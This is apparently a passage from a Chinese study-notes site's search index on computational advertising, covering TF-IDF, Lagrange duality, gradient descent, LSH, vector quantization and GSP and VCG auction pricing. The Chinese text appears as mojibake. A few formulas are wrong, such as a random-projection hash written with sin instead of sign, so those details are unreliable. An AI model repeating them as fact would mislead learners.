å€’æ’ç´¢å¼•ï¼ˆinverted indexï¼‰ï¼š\n ç°ä»£æœç´¢å¼•æ“çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯ï¼šç”¨ O(1) çš„æ—¶é—´å¤æ‚åº¦å°†ä»å¤§é‡æ–‡æ¡£ä¸­æŸ¥æ‰¾åŒ…å«æŸäº›è¯çš„æ–‡æ¡£é›†åˆï¼› è¿™é‡Œä¸ä¼šå¯¹è¿™ä¸€æŠ€æœ¯æ·±å…¥ä»‹ç»ï¼Œå¯ä»¥æ·±å…¥å­¦ä¹ ç›¸å…³æ–‡çŒ®æˆ–è€…å¼€æºçš„å€’æ’ç´¢å¼•å·¥å…· Luceneï¼›  å‘é‡ç©ºé—´æ¨¡å‹ï¼ˆVector Space Model, VSMï¼‰ï¼šæ–‡æ¡£ç›¸ä¼¼åº¦åº¦é‡æ–¹æ³•ä¹‹ä¸€ï¼Œå®ƒæœ‰ä¸¤ä¸ªæ ¸å¿ƒæŠ€æœ¯ï¼š\n æ–‡æ¡£è¡¨ç¤ºæ–¹å¼ç”¨â€è¯è¢‹å‡è®¾â€œï¼ˆBags of words, BoWï¼‰ï¼š  ç”¨å„ä¸ªå…³é”®è¯åœ¨æ–‡æ¡£ä¸­çš„â€œå¼ºåº¦â€ç»„æˆçš„å‘é‡è¡¨ç¤ºè¿™ä¸ªæ–‡æ¡£ï¼š$$d = (x_1, x_2, \\cdots, x_M)^T$$ å…¶ä¸­â€œå¼ºåº¦â€ä¸€èˆ¬ç”¨ TF-IDF æ–¹å¼è®¡ç®—ï¼Œå³ $$TF * IDF$$ã€‚ TF ä¸ºè¯¥è¯åœ¨æ–‡æ¡£ä¸­å‡ºç°çš„æ¬¡æ•°ï¼› IDF æ˜¯å€’æ•°æ–‡æ¡£é¢‘ç‡ï¼Œè¡¨ç¤ºä¸€ä¸ªè¯åœ¨æ‰€æœ‰æ–‡æ¡£ä¸­å‡ºç°çš„é¢‘ç¹ç¨‹åº¦ï¼Œæœ€å¸¸è§çš„è®¡ç®—å½¢å¼ä¸º $$\\displaystyle IDF(m) = log(\\frac{N}{DF(m)})$$ï¼Œå…¶ä¸­ DF ä¸ºè¿™ä¸ªå‡ºç°äº†è¿™ä¸ªè¯çš„æ–‡æ¡£æ€»ä¸ªæ•°ï¼›   è®¡ç®—ä¸¤ä¸ªæ–‡æ¡£çš„ç›¸ä¼¼åº¦ä¸€èˆ¬ä½¿ç”¨çŸ¢é‡çš„ä½™å¼¦è·ç¦»ï¼š$$\\displaystyle cos(d_1, d_2) = \\frac{d_1^T d_2}{|d_1||d_2|}$$  è™½ç„¶ VSM ä¸æ˜¯å®é™…ç³»ç»Ÿä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œä¸è¿‡è¿™æ˜¯ä¸€ç§ç®€å•ã€æ— è®­ç»ƒçš„åŸºçº¿æ–¹æ³•ï¼Œåœ¨æ¢ç´¢æ›´ç²¾ç»†æ¨¡å‹æ—¶ï¼Œå¿…é¡»é¦–å…ˆä¸ VSM åšæ¯”è¾ƒã€‚\næœ€ä¼˜åŒ–æ–¹æ³• #  æœ€ä¼˜åŒ–é—®é¢˜ï¼š\n ç»™å®šæŸä¸ªç¡®å®šçš„ç›®æ ‡å‡½æ•° fï¼Œä»¥åŠè¯¥å‡½æ•°è‡ªå˜é‡æ»¡è¶³çš„ä¸€äº›çº¦æŸæ¡ä»¶ï¼Œæ±‚è§£è¯¥å‡½æ•°çš„æœ€å¤§å€¼æˆ–æœ€å°å€¼é—®é¢˜ï¼› å¯ä»¥ä¸€èˆ¬åœ°è¡¨ç¤ºä¸ºï¼šæ±‚ $$min f(x)$$ï¼Œä½¿å¾— $$g(x) \\le 0, h(x) = 0,$$  æ‹‰æ ¼æœ—æ—¥ä¹˜å­æ³• #   å‚è€ƒï¼šhttps://www.cxybb.com/article/Emma_Love/85146800\n ç›®æ ‡ï¼š\n ç”¨äºè§£å†³å¸¦çº¦æŸæ¡ä»¶ä¸‹çš„ä¼˜åŒ–é—®é¢˜ï¼›  åŸºæœ¬æ€æƒ³ï¼š\n é€šè¿‡å¼•å…¥æ‹‰æ ¼æœ—æ—¥ä¹˜å­ï¼Œå°†å«æœ‰ n ä¸ªå˜é‡ã€k ä¸ªçº¦æŸæ¡ä»¶çš„çº¦æŸä¼˜åŒ–é—®é¢˜è½¬åŒ–ä¸ºå«æœ‰(n+k) ä¸ªå˜é‡çš„æ— çº¦æŸä¼˜åŒ–é—®é¢˜ã€‚  å…·ä½“å®ç°ï¼š\n å°†ä¸€èˆ¬çš„å¸¦çº¦æŸä¼˜åŒ–é—®é¢˜ï¼š$$\\min{f(\\vec{x})}, \\text{s.t.} g(\\vec{x}) \\le 0, h(\\vec{x}) = 0$$ è½¬åŒ–ä¸ºå¦‚ä¸‹ä¸å¸¦çº¦æŸçš„æ‹‰æ ¼æœ—æ—¥å¯¹å¶å‡½æ•°ï¼ˆLagrange Dual Functionï¼‰ï¼š$$L(\\vec{\\lambda}, \\vec{v}) = \\inf_x{f(\\vec{x}) + \\vec{\\lambda}^Tg(\\vec{x}) + \\vec{v}^T h(\\vec{x})}$$ï¼Œå…¶ä¸­ Inf ä¸ºä¸‹ç¡®ç•Œå‡½æ•°ã€$$\\vec{\\lambda}, \\vec{v}$$ ä¸ºæ‹‰æ ¼æœ—æ—¥ä¹˜å­ã€‚ å¯ä»¥è¯æ˜ï¼Œå¯¹å¶é—®é¢˜çš„æœ€ä¼˜å€¼ä¸ºåŸé—®é¢˜æœ€ä¼˜å€¼çš„ä¸‹ç•Œï¼Œä¸¤è€…å®Œå…¨ä¸€è‡´æ—¶ç§°ä¸ºâ€œå¼ºå¯¹å¶â€ï¼›å¯ä»¥è¯æ˜ï¼ŒåŸé—®é¢˜æ—¶å‡¸ä¼˜åŒ–é—®é¢˜æ—¶ï¼Œå„ä¸ªçº¦æŸå‡½æ•°å¯è¡ŒåŸŸçš„è§£ä¹Ÿæ˜¯å‡¸çš„è¯ï¼Œå¼ºå¯¹å¶æ€»æ˜¯è¢«æ»¡è¶³çš„ã€‚  KKT æ¡ä»¶ï¼Œè®¾æœ€ä¼˜è§£æ˜¯ $$\\vec{x}^*$$\n $$x^$$ è¦åŸé¢˜è®¾ä¸­çš„çº¦æŸæ¡ä»¶ï¼š$$g(\\vec{x^}) \\le 0, h(\\vec{x^*}) = 0$$ $$\\vec{\\lambda} \u0026gt; 0$$ï¼šå¯¹ä¸ç­‰å¼è¿›è¡Œåˆ†æƒ…å†µè®¨è®ºåå¾—å‡ºçš„å¿…è¦æ¡ä»¶ï¼› $$\\lambda_i \\cdot g(x_i^*) = 0$$ï¼šç§°ä½œæ¾å¼›äº’è¡¥æ¡ä»¶ï¼›  ä¸‹é™å•çº¯å½¢æ³• #  åœ¨è‡ªå˜é‡ä¸ºä¸€ç»´çš„æƒ…å†µä¸‹ï¼Œç»™å®šä¸€ä¸ªåˆå§‹åŒºé—´ï¼Œå‡è®¾åŒºé—´å†…æœ‰å”¯ä¸€çš„æœ€å°å€¼ï¼Œå¯ä»¥æŒ‰ç…§åˆ†å‰²çš„æ–¹æ³•ä¸æ–­ç¼©å°åŒºé—´ä»¥å¾—åˆ°æœ€å°å€¼ï¼›\nä¸Šé¢çš„æ–¹æ³•æ¨å¹¿åˆ°é«˜ç»´çš„æƒ…å½¢å¯¹åº”çš„ç®—æ³•è¢«ç§°ä¸ºâ€œä¸‹é™å•çº¯å½¢æ³•â€ï¼ˆDownhill Simplex Methodï¼‰ï¼Œæˆ–è€…å°†é˜¿ç±³å·´ï¼ˆAmebaï¼‰å˜å½¢è™«æ³•ã€‚\næ¢¯åº¦ä¸‹é™æ³• #  å½“ç›®æ ‡å‡½æ•° f æ¯”è¾ƒå®¹æ˜“è¿›è¡Œæ±‚å¯¼æ—¶ï¼ŒåŸºäºæ¢¯åº¦çš„æ–¹æ³•æ˜¯é¦–è¦é€‰æ‹©ï¼Œå°±æ˜¯æ¯æ¬¡æ²¿ç€æ¢¯åº¦ç›¸åçš„æ–¹å‘å‰è¿›ä¸€å°æ­¥ï¼Œè¿­ä»£å¾—åˆ°æœ€ä¼˜è§£ï¼Œè¿™ç§æ–¹æ³•ç§°ä¸ºâ€œæ¢¯åº¦ä¸‹é™æ³•â€ï¼ˆGradient Descentï¼‰ï¼Œå…¶æ›´æ–°å…¬å¼ä¸ºï¼š\n $$x \\leftarrow x - \\epsilon \\cdot \\nabla{f(x)}$$ï¼Œå…¶ä¸­ $$\\epsilon$$ æ§åˆ¶ç€ä¸‹é™é€Ÿåº¦ï¼Œè¢«ç§°ä¸ºå­¦ä¹ ç‡ï¼›  æ¢¯åº¦ä¸‹é™çš„å¦ä¸€ç§å˜å½¢æ˜¯â€œéšæœºæ¢¯åº¦ä¸‹é™æ³•â€ï¼ˆStochastic Gradient Descent, SGDï¼‰ï¼š\n æ›´æ–°å…¬å¼ï¼š$$x \\leftarrow x - \\epsilon \\cdot \\nabla{f^i(x)}$$ï¼ŒåŒºåˆ«åœ¨äºå…¶ä¸­ $$\\nabla{f^i(x)}$$ æ˜¯åŸºäºå°‘é‡æ ·æœ¬æ„æˆçš„æ ·æœ¬ç»„è®¡ç®—å‡ºçš„æ¢¯åº¦ï¼› è§£å†³çš„é—®é¢˜ï¼šSGD ç›¸å¯¹äº GD è§£å†³äº†æ”¶æ•›é€Ÿåº¦æ…¢å’Œé™·å…¥å±€éƒ¨æœ€ä¼˜çš„é—®é¢˜ï¼›  æ‹Ÿç‰›é¡¿æ³• #  ç»Ÿè®¡æœºå™¨å­¦ä¹  #  "},{"id":379,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/11.%E5%90%88%E7%BA%A6%E5%B9%BF%E5%91%8A%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/","title":"11.åˆçº¦å¹¿å‘Šæ ¸å¿ƒæŠ€æœ¯","section":"è®¡ç®—å¹¿å‘Š","content":"åˆçº¦å¹¿å‘Šæ ¸å¿ƒæŠ€æœ¯ #  å¹¿å‘Šæ’æœŸç³»ç»Ÿ #  é˜²å¤©çª—å¹¿å‘Šï¼šå¹¿å‘ŠåŠ è½½é”™è¯¯æ—¶çš„é»˜è®¤å¹¿å‘Šã€‚\nåœ¨çº¿åˆ†é… #   å‚è€ƒèµ„æ–™ï¼š\n æ‹‰æ ¼æœ—æ—¥å¯¹å¶é—®é¢˜ï¼šhttps://zhuanlan.zhihu.com/p/31131842   åœ¨çº¿åˆ†é…æŠ€æœ¯è§£å†³çš„å…¸å‹é—®é¢˜ï¼š\n GD é—®é¢˜ã€AdWords é—®é¢˜ã€å±•ç¤ºå¹¿å‘Šé—®é¢˜ã€æœ€å¤§ä»£è¡¨æ€§åˆ†é…ï¼ˆMRAï¼‰é—®é¢˜ã€è¯¢ä»·ä¼˜åŒ–é—®é¢˜ç­‰ï¼›  å®ç”¨çš„ä¸€äº›åœ¨çº¿åˆ†é…æ–¹æ¡ˆï¼š\n ç›´æ¥æ±‚è§£åŸå§‹çš„åˆ†é…æ–¹æ¡ˆï¼› åŸºäºå¯¹å¶ç®—æ³•çš„ç´§å‡‘åˆ†é…æ–¹æ¡ˆï¼› ç»¼åˆåˆ†é…æ–¹æ¡ˆ SHALEï¼› å¯å‘å¼åˆ†é…æ–¹æ¡ˆ HWMï¼›  "},{"id":380,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/12.%E5%8F%97%E4%BC%97%E5%AE%9A%E5%90%91%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/","title":"12.å—ä¼—å®šå‘æ ¸å¿ƒæŠ€æœ¯","section":"è®¡ç®—å¹¿å‘Š","content":"å—ä¼—å®šå‘æ ¸å¿ƒæŠ€æœ¯ #  æ–‡æœ¬ä¸»é¢˜æŒ–æ˜ #  ä¸‰ç§è§£å†³æ¨¡å‹ï¼š\n LSA æ¨¡å‹ï¼ˆæ½œåœ¨è¯­ä¹‰åˆ†æï¼ŒLatent Semantic Analysisï¼‰ï¼› PLSI æ¨¡å‹ï¼ˆæ¦‚ç‡æ½œåœ¨è¯­ä¹‰ç´¢å¼•ï¼ŒProbabilistic Latent Semantic Indexingï¼‰ï¼› LDA æ¨¡å‹ï¼ˆæ½œåœ¨ç‹„åˆ©å…‹é›·åˆ†é…ï¼ŒLatent Dirichlet Allocationï¼‰ï¼›  è¡Œä¸ºå®šå‘ #  è¡Œä¸ºå®šå‘å»ºæ¨¡é—®é¢˜ï¼š\n å·¥ç¨‹ä¸Šéå¸¸å…¸å‹çš„å»ºæ¨¡æ€è·¯ï¼šå½“é¢å¯¹å¤šä¸ªè‡ªå˜é‡çš„å›å½’é—®é¢˜æ—¶ï¼Œå¯ä»¥å…ˆæ ¹æ®ç›®æ ‡å€¼çš„ç‰¹æ€§é€‰æ‹©åˆé€‚çš„æŒ‡æ•°æ—åˆ†å¸ƒæ¥æè¿°ï¼Œå¹¶ç”¨çº¿æ€§æ¨¡å‹å°†å¤šä¸ªè‡ªå˜é‡å’ŒæŒ‡æ•°æ—åˆ†å¸ƒçš„å‚æ•°è”ç³»èµ·æ¥ã€‚  "},{"id":381,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/13.%E7%AB%9E%E4%BB%B7%E5%B9%BF%E5%91%8A%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/","title":"13.ç«ä»·å¹¿å‘Šæ ¸å¿ƒæŠ€æœ¯","section":"è®¡ç®—å¹¿å‘Š","content":"ç«ä»·å¹¿å‘Šæ ¸å¿ƒæŠ€æœ¯ #  å¯¹äºä¸€ä¸ª CPC ç»“ç®—çš„ç«ä»·å¹¿å‘Šç³»ç»Ÿï¼Œéœ€è¦å¾—åˆ°å¹¿å‘Šå€™é€‰é›†åˆï¼Œå¹¶è®¡ç®—æ¯ä¸ªå€™é€‰çš„ç‚¹å‡»ç‡ã€‚è¿™å¯¹åº”ç€ä¸¤ä¸ªç«ä»·å¹¿å‘Šå…³é”®çš„è®¡ç®—é—®é¢˜ï¼Œå³â€œå¹¿å‘Šæ£€ç´¢â€å’Œâ€œå¹¿å‘Šæ’åºâ€ã€‚\næœç´¢å¹¿å‘Šç³»ç»Ÿ #  æŸ¥è¯¢æ‰©å±• #  éœ€æ±‚æ–¹éœ€è¦é€šè¿‡æ‰©å±•å…³é”®è¯è·å¾—æ›´å¤šçš„æµé‡ï¼Œä¾›ç»™ä¾§åˆ™éœ€è¦å€Ÿæ­¤æ¥å˜ç°æ›´å¤šçš„æµé‡å’Œæé«˜ç«ä»·çš„æ¿€çƒˆç¨‹åº¦ã€‚\nç›¸å…³çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä»‹ç»ä¸‰ç§ä¸»è¦çš„æ€è·¯ï¼š\n  åŸºäºæ¨èçš„æ–¹æ³•ï¼š\u0010\n è€ƒè™‘ç”¨æˆ·çš„ä¸€ä¸ªä¼šè¯ï¼ˆ$$s = {1, \\cdots, M}$$ï¼‰å’Œä¸€ç»„å…³é”®è¯ $$w = {1, \\cdots, N}$$ å¯¹åº”çš„äº¤äº’å¼ºåº¦çŸ©é˜µ $${x_{mn}}_{M \\times N}$$ï¼ŒçŸ©é˜µçš„å€¼è¡¨ç¤ºç”¨æˆ·åœ¨è¿™ä¸ªä¼šè¯ä¸­æœç´¢å¯¹åº”å…³é”®è¯çš„æ¬¡æ•°ã€‚ æ¨èæ–¹æ³•çš„åŸºæœ¬ä»»åŠ¡ï¼šåŸºäºä¸Šè¿°çŸ©é˜µä¸­çš„å·²çŸ¥å…ƒç´ å€¼ï¼Œå»é¢„æµ‹å¡«å……çŸ©é˜µä¸­æ²¡æœ‰è§‚æµ‹çš„å•å…ƒã€‚ ååŒè¿‡æ»¤ï¼šè¿™æ ·çš„é—®é¢˜ä¹Ÿè¢«ç§°ä¸ºâ€œååŒè¿‡æ»¤é—®é¢˜â€ï¼ˆCollaborative Filteringï¼ŒCFï¼‰ï¼Œå³æ ¹æ®ç¾¤ä½“ç”¨æˆ·çš„é€‰æ‹©å…³è”æ€§è¿›è¡Œæ¨èçš„é—®é¢˜ã€‚ ç®—æ³•ï¼šååŒè¿‡æ»¤çš„æ¨èç®—æ³•å¯ä»¥ä¸»è¦åˆ†ä¸ºâ€œåŸºäºå†…å­˜çš„éå‚æ•°æ–¹æ³•â€å’Œâ€œåŸºäºæ¨¡å‹çš„å‚æ•°åŒ–æ–¹æ³•â€ï¼Œå„ç§æ¨èé—®é¢˜çš„æœ¬è´¨éƒ½æ˜¯å¯¹äº¤äº’å¼ºåº¦çŸ©é˜µè¿›è¡Œå¹³æ»‘ã€‚    åŸºäºä¸»é¢˜æ¨¡å‹çš„æ–¹æ³•ï¼š\n  åŸºäºå†å²æ•ˆæœçš„æ–¹æ³•ï¼š\n  å¹¿å‘Šæ£€ç´¢ #  å¸ƒå°”è¡¨è¾¾å¼æ£€ç´¢ #  ç›¸å…³æ€§æ£€ç´¢ #  åŸºäº DNN çš„è¯­ä¹‰å»ºæ¨¡ #  æœ€è¿‘é‚»è¯­ä¹‰æ£€ç´¢ #  æœ€è¿‘é‚»æ£€ç´¢çš„å·¥ç¨‹æ•ˆç‡æ˜¯ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š\n æŠŠâ€œæŸ¥è¯¢â€å’Œâ€œæ–‡æ¡£â€éƒ½é€šè¿‡ä¸Šä¸€èŠ‚ä¸­åŸºäº DNN çš„ç›¸å…³æ€§å»ºæ¨¡è¿›è¡Œ Word-Embedding è¡¨è¾¾åï¼Œæ£€ç´¢æœ€ç›¸å…³çš„ K ä¸ªæ–‡æ¡£çš„é—®é¢˜ï¼Œå°±æ˜¯åœ¨å‘é‡ç©ºé—´ä¸­è®¡ç®—æŸ¥è¯¢ c ä¸æ‰€æœ‰å€™é€‰æ–‡æ¡£ a ä¹‹é—´çš„ K ä¸ªæœ€è¿‘é‚»é—®é¢˜ã€‚ åŠ é€Ÿæœ€è¿‘é‚»æ£€ç´¢ç®—æ³•ç§°ä¸º â€œANN æŸ¥æ‰¾ (Approximate Nearest Neighbor)â€ï¼Œæœ‰ä¸‰ç±»å…¸å‹ç®—æ³•ï¼šå“ˆå¸Œç®—æ³•ã€å‘é‡é‡åŒ–ç®—æ³•ã€åŸºäºå›¾çš„ç®—æ³•ï¼›  å“ˆå¸Œç®—æ³•ï¼Œåˆ†ä¸ºæ•°æ®æ— å…³çš„è½»é‡çº§ç®—æ³•ã€æ•°æ®æœ‰å…³çš„ç®—æ³•ï¼ˆå­¦ä¹ å“ˆå¸Œã€è¯­ä¹‰å“ˆå¸Œã€æ·±åº¦å­¦ä¹ å“ˆå¸Œç­‰ï¼‰ã€‚\næœ€å¸¸è§çš„æ˜¯æ•°æ®æ— å…³çš„â€œå±€éƒ¨æ•æ„Ÿå“ˆå¸Œç®—æ³•â€ï¼ˆLocal Sensitive Hashing, LSHï¼‰ï¼š\n é’ˆå¯¹ä¸åŒçš„è·ç¦»åº¦é‡æ–¹å¼ï¼ŒLSH å­˜åœ¨ç€ä¸åŒçš„æ•£åˆ—å‡½æ•°å®¶æ—ã€‚æ¯”å¦‚ Jaccard å‡½æ•°ä¸‹ä¸º min-hash å‡½æ•°ã€ä½™å¼¦è·ç¦»ä¸‹ä¸ºéšæœºæŠ•å½±ã€‚ éšæœºæŠ•å½±ï¼ˆrandom projectionï¼‰ï¼šå¯¹äºå‘é‡ $$\\vec{x}$$ï¼Œéšæœºç”Ÿæˆä¸€ä¸ªè¶…å¹³é¢ pï¼Œå–å“ˆå¸Œå‡½æ•° $$h(\\vec{x}) = \\sin{(\\vec{x} \\cdot p)}$$ï¼› éšæœºæŠ•å½±çš„é—®é¢˜ï¼šä¸€æ˜¯æœ‰å¯èƒ½å„ä¸ªæ¡¶å†…çš„æ•°æ®åˆ†å¸ƒä¸å‡åŒ€ï¼ŒäºŒæ˜¯ä¸èƒ½ä¿è¯å¬å›ç‡ï¼› é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼šç”Ÿæˆå¤šç»„æŠ•å½±ç»„æˆæ¡¶å·ï¼Œç”¨ç©ºé—´æ¢å–å¬å›ç‡ï¼ˆLSH Forestï¼‰ã€ç”¨æ—¶é—´æ¢å–å¬å›ç‡ï¼ˆmulti-probe LSHï¼‰ï¼›  å‘é‡é‡åŒ–ï¼ˆVector Quantization, VQï¼‰æ˜¯ä¸€ç§å¯¹å‘é‡ $$\\vec{x}$$ åšæ•´ä½“é‡åŒ–ï¼Œå°†å…¶æ˜ å°„åˆ° K ä¸ªç¦»æ•£å‘é‡ä¸­çš„ä¸€ä¸ªï¼Œä»è€Œå®ç°å‹ç¼©æ•°æ®çš„ç®—æ³•ã€‚å®ƒé€šå¸¸ç”±â€œç æœ¬ç”Ÿæˆé˜¶æ®µå»ºç«‹ç´¢å¼•â€ï¼Œâ€œç å­—æœç´¢é˜¶æ®µæŸ¥è¯¢ç´¢å¼•â€ä¸¤ä¸ªéƒ¨åˆ†æ„æˆã€‚\nK å‡å€¼èšç±»ç®—æ³•å¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§å‘é‡é‡åŒ–ï¼š\n ç æœ¬ç”Ÿæˆé˜¶æ®µï¼šé€šè¿‡èšç±»äº§ç”Ÿ K ä¸ªè´¨å¿ƒçš„å‘é‡ï¼Œå°†æ•°æ®é›†ä¸­çš„æ‰€æœ‰æ•°æ®æ˜ å°„ä¸ºä¸€ä¸ª K ç»´çš„ç¨€ç–ç¼–ç çš„ç å‘é‡ï¼› ç å­—æœç´¢é˜¶æ®µï¼šå¯»æ‰¾ä¸ x è·ç¦»æœ€è¿‘çš„ä¸€ä¸ªç±»åˆ«çš„è´¨å¿ƒæ¥è¡¨è¾¾ä»–ï¼›  ä¹˜ç§¯é‡åŒ–ï¼ˆProduct Quantization, PQï¼‰æ˜¯ä¸€ç§å¸¸è§çš„ K å‡å€¼æ”¹è¿›ç®—æ³•ï¼ŒFacebook çš„å¼€æºå·¥å…· faiss ç”±å…¶é«˜æ•ˆçš„å®ç°ï¼š\n   "},{"id":382,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/2.%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A%E5%9F%BA%E7%A1%80/","title":"2.è®¡ç®—å¹¿å‘ŠåŸºç¡€","section":"è®¡ç®—å¹¿å‘Š","content":"è®¡ç®—å¹¿å‘ŠåŸºç¡€ #  æ ¸å¿ƒé—®é¢˜ #  è®¡ç®—å¹¿å‘Šçš„æ ¸å¿ƒé—®é¢˜ç”¨æ–‡å­—è¡¨è¿°å¦‚ä¸‹ï¼š\n ä¸ºä¸€ç³»åˆ—çš„ç”¨æˆ·ä¸ä¸Šä¸‹æ–‡çš„ç»„åˆæ‰¾åˆ°æœ€åˆé€‚çš„å¹¿å‘ŠæŠ•æ”¾ç­–ç•¥ä»¥ä¼˜åŒ–æ•´ä½“å¹¿å‘Šæ´»åŠ¨çš„åˆ©æ¶¦ï¼›  åœ¨æ•°å­¦ä¸Šï¼Œå¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªæœ€ä¼˜åŒ–é—®é¢˜ï¼š\n  $$\\displaystyle \\max{\\sum_{i=1}^T (r_i - q_i)}, \\text{ s.t. } \\sum_{i=1}^Td_{ik} \\le D_k, \\forall k$$\n  å…¶ä¸­ i è¡¨ç¤ºæŸæ¬¡å¹¿å‘Šå±•ç¤ºã€k è¡¨ç¤ºæŸä¸ªå¹¿å‘Šä¸»ï¼›r ä¸ºæ€»æ”¶å…¥ã€q ä¸ºæ€»æˆæœ¬ã€D ä¸ºæŸä¸ªå¹¿å‘Šä¸»çš„é¢„ç®—ï¼›\n  å¼•å…¥ aã€uã€c è¡¨ç¤ºå¹¿å‘Šã€ç”¨æˆ·ã€ä¸Šä¸‹æ–‡ï¼Œé‚£ä¹ˆä¸Šé¢çš„æ•°å­¦è¡¨è¾¾å¼ä¸­çš„ rã€q æ˜¯å…³äºå®ƒä»¬çš„å‡½æ•°ï¼›\n  ä¹Ÿå°±æ˜¯å…¬å¼ï¼š$$\\displaystyle \\max{\\sum_{i=1}^T (r(a_i, u_i, c_i) - q(a_i, u_i, c_i))}, \\text{ s.t. } \\sum_{i=1}^Td(a_i, u_i, c_i, k) \\le D(k), \\forall k$$\n  ä¸Šé¢çš„å¹¿å‘Šæ”¶å…¥æ˜¯æˆ‘ä»¬ç ”ç©¶çš„é‡ç‚¹ï¼Œå¯ä»¥æŒ‰ç…§å•æ¬¡å¹¿å‘Šå±•ç¤ºé¢„æœŸæ”¶å…¥ï¼ˆeCPMï¼‰åˆ†è§£ï¼š\n $$eCPM = r(a,u, c) = \\mu(a, u, c) \\cdot v(a, u, c)$$ï¼Œå…¶ä¸­ $$\\mu$$ è¡¨ç¤ºç‚¹å‡»ç‡ï¼Œv è¡¨ç¤ºå•è¯ç‚¹å‡»å¸¦æ¥çš„æ”¶ç›Šï¼›  "},{"id":383,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/5.%E7%AB%9E%E4%BB%B7%E5%B9%BF%E5%91%8A/","title":"5.ç«ä»·å¹¿å‘Š","section":"è®¡ç®—å¹¿å‘Š","content":"ç«ä»·å¹¿å‘Š #  ä½ç½®æ‹å– #  å¦‚ä½•è®¾è®¡ä½ç½®æ‹å–é—®é¢˜ä¸­çš„ä¸€äº›é‡è¦æœºåˆ¶ï¼Œå¾€å¾€å½±å“æ•´ä¸ªå¸‚åœºçš„æ”¶ç›Šã€ç¨³å®šæ€§ã€å…¬å¹³æ€§ï¼Œå¸¸è§çš„æœºåˆ¶åŒ…æ‹¬â€œå®šä»·â€ã€â€œå¸‚åœºä¿ç•™ä»·â€ã€â€œä»·æ ¼æŒ¤å‹â€ç­‰ã€‚\nå¸‚åœºä¿ç•™ä»·ï¼ˆMarket Reserve Price, MRPï¼‰ #  ç«ä»·å¹¿å‘Šå¸‚åœºé€šå¸¸è¦è®¾ç½®ä¸€ä¸ªèµ¢å¾—æ‹å–ä½ç½®çš„æœ€ä½ä»·æ ¼ï¼Œå¹¿å‘Šä¸»åªæœ‰åœ¨é«˜äºè¿™ä¸ªä»·æ ¼æ—¶æ‰èƒ½è·å¾—ç«ä»·æœºä¼šï¼Œè¿™ä¸ªä»·æ ¼å°±ç§°ä¹‹ä¸ºå¸‚åœºä¿ç•™ä»· MRPã€‚\nå¸‚åœºä¿ç•™ä»·çš„è®¾ç½®æœ‰ä¸¤ç§æ–¹å¼ï¼š\n å¯¹è¿™ä¸ªæ•´ä¸ªç«ä»·å¸‚åœºé‡‡ç”¨åŒæ ·çš„ MRPï¼› æ ¹æ®ä¸åŒçš„æ ‡çš„ç‰©ï¼ˆæ¯”å¦‚æœç´¢å¹¿å‘Šé‡Œé¢çš„å…³é”®è¯ï¼‰çš„ç‰¹æ€§è®¾ç½®ä¸åŒçš„ MRPï¼›  æ— è®ºæ˜¯å“ªç§è®¾ç½®æ–¹å¼ï¼ŒåŸºæœ¬åŸç†éƒ½æ˜¯ï¼š\n eCPM åˆ†å¸ƒ $$\\rightarrow$$ å¡«å……ç‡æ²¡æœ‰æ˜æ˜¾ä¸‹é™çš„ CPM-MRP $$\\rightarrow$$ æ ¹æ®è´¨é‡å€’æ¨ CPC-MRPï¼›  å®šä»·é—®é¢˜ #  çº³ä»€å‡è¡¡ï¼ˆNash Equilibriumï¼‰çŠ¶æ€ï¼šæ¯ä¸ªå¹¿å‘Šå•†éƒ½é€šè¿‡å‡ºä»·å¾—åˆ°æœ€ç¬¦åˆè‡ªå·±åˆ©ç›Šçš„ä½ç½®ã€‚\nGSP å®šä»·ï¼ˆå¹¿ä¹‰ç¬¬äºŒé«˜ä»·ï¼‰ï¼šæœ€å¸¸è§çš„å®šä»·ç­–ç•¥ï¼Œå‘æœ€é«˜å‡ºä»·æ”¶å–å…¶ä¸‹ä¸€ä½å¹¿å‘Šä¸»çš„å‡ºä»·ï¼›\nVCG å®šä»·ï¼ˆVickrey-Clarke-Groves ç ”ç©¶å¾—åˆ°çš„ç¤¾ä¼šç¦åˆ©æœ€ä¼˜å®šä»·ç­–ç•¥ï¼‰ï¼š\n å®ƒçš„åŸºæœ¬æ€æƒ³æ˜¯å¯¹åº”èµ¢å¾—æŸä¸ªå¹¿å‘Šä½çš„å¹¿å‘Šä¸»ï¼Œå®ƒä»˜å‡ºçš„æˆæœ¬åº”è¯¥ç­‰äºä»–å æ®è¿™ä¸ªä½ç½®ç»™å…¶ä»–å¸‚åœºå‚ä¸è€…å¸¦æ¥çš„ä»·å€¼æŸå®³ã€‚ å…·ä½“çš„è¯´ï¼ŒæŸä¸ªä½ç½® s çš„å®šä»·ä¸ºï¼š$$\\displaystyle q_s = \\sum_{t \\gt s} (\\mu_{t - 1} - \\mu_t) \\cdot v_{t}$$  Myerson æœ€ä¼˜æ‹å–ï¼š\n 